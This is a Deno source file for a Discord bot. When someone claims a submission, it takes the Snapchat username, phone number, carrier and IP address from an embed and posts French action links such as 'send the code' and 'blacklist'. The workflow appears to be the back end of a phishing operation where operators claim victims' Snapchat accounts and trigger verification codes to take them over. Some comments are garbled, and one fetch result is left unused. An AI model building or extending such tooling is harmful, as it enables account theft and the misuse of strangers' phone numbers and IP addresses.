import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

function hexToBytes(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.slice(i, i + 2), 16);
  }
  return bytes;
}

async function verifySignature(req, bodyText) {
  const sig = req.headers.get("X-Signature-Ed25519");
  const ts = req.headers.get("X-Signature-Timestamp");
  const pubKey = Deno.env.get("DISCORD_PUBLIC_KEY");
  if (!sig || !ts || !pubKey) return false;
  try {
    const key = await crypto.subtle.importKey("raw", hexToBytes(pubKey), { name: "Ed25519" }, false, ["verify"]);
    const msg = new TextEncoder().encode(ts + bodyText);
    return await crypto.subtle.verify("Ed25519", key, hexToBytes(sig), msg);
  } catch {
    return false;
  }
}

async function botAPI(endpoint, method = "GET", body = null) {
  const res = await fetch(`https://discord.com/api/v10${endpoint}`, {
    method,
    headers: {
      "Authorization": `Bot ${Deno.env.get("DISCORD_BOT_TOKEN")}`,
      "Content-Type": "application/json"
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  if (!res.ok) throw new Error(`Discord ${res.status}: ${text}`);
  return text ? JSON.parse(text) : {};
}

async function handleClaim(body, token) {
  const appId = Deno.env.get("DISCORD_APP_ID") || body.application_id;
  const submissionId = body.data.custom_id.replace("claim_", "");
  const userId = body.member?.user?.id || body.user?.id;
  const username = body.member?.user?.username || body.user?.username;
  const channelId = body.channel_id;
  const messageId = body.message?.id;

  // Use service role directly (no user auth needed for background work)
  const base44Url = `https://api.base44.app/api/v2/apps/${Deno.env.get("BASE44_APP_ID")}`;

  // Fetch submission via service role
  const subRes = await fetch(`${base44Url}/entities/Submission/${submissionId}`, {
    headers: { "Authorization": `Bearer ${Deno.env.get("BASE44_SERVICE_TOKEN") || ""}` }
  });

  // Use botAPI to get submission data via the Base44 SDK approach
  // We'll directly call the Base44 REST API isn't available here, use a workaround:
  // Store minimal data in the custom_id isn't feasible for all fields.
  // Instead: fetch submission info from the message embed fields directly.
  const msgData = body.message;
  const embed = msgData?.embeds?.[0];
  const fields = embed?.fields || [];
  const getField = (name) => fields.find(f => f.name?.includes(name))?.value || "N/A";

  const snapchat = getField("Utilisateur").replace("@", "");
  const operateur = getField("Opérateur");
  const telephone = getField("Numéro").replace(/\s/g, "");
  const ipRaw = getField("IP");
  const ip = ipRaw.replace(/`/g, "").trim();

  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";

  const threadContent =
    `# 🔐 Demande prise en charge par <@${userId}>\n` +
    `**👻 Snapchat:** @${snapchat}\n` +
    `**📞 Téléphone:** ${telephone}\n` +
    `**📡 Opérateur:** ${operateur}\n\n` +
    `## ⚡ Actions disponibles\n` +
    `✅ [**Envoyer le code**](${appUrl}/?trigger=${submissionId})\n` +
    `❌ [**Mauvais numéro**](${appUrl}/?triggerAction=wrong&id=${submissionId})\n` +
    `⏳ [**File d'attente**](${appUrl}/?triggerAction=wait&id=${submissionId})\n` +
    `🚫 [**Blacklist**](${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(ip)})`;

  // Create thread from message
  const thread = await botAPI(`/channels/${channelId}/messages/${messageId}/threads`, "POST", {
    name: `📋 ${snapchat} — ${operateur}`,
    auto_archive_duration: 60
  });

  // Add claimant to thread
  await botAPI(`/channels/${thread.id}/thread-members/${userId}`, "PUT");

  // Post actions in thread
  await botAPI(`/channels/${thread.id}/messages`, "POST", { content: threadContent });

  // Disable button on original message
  await botAPI(`/channels/${channelId}/messages/${messageId}`, "PATCH", {
    components: [{
      type: 1,
      components: [{
        type: 2,
        style: 2,
        label: `✅ Pris par @${username}`,
        custom_id: "claimed_done",
        disabled: true
      }]
    }]
  });

  // Edit the deferred reply with result
  await fetch(`https://discord.com/api/v10/webhooks/${appId}/${token}/messages/@original`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: `✅ Thread créé ! <#${thread.id}>` })
  });
}

Deno.serve(async (req) => {
  const bodyText = await req.text();

  if (!await verifySignature(req, bodyText)) {
    return new Response("Invalid signature", { status: 401 });
  }

  const body = JSON.parse(bodyText);

  // Discord PING handshake
  if (body.type === 1) return Response.json({ type: 1 });

  // Button click
  if (body.type === 3 && body.data?.custom_id?.startsWith("claim_")) {
    const token = body.token;

    // Respond immediately with DEFERRED_UPDATE_MESSAGE (type 6) — updates the original message silently
    // Then do all async work in background
    const deferResponse = Response.json({ type: 6 });

    // Run background work after responding
    handleClaim(body, token).catch(e => console.error("handleClaim error:", e.message));

    return deferResponse;
  }

  return Response.json({ type: 1 });
});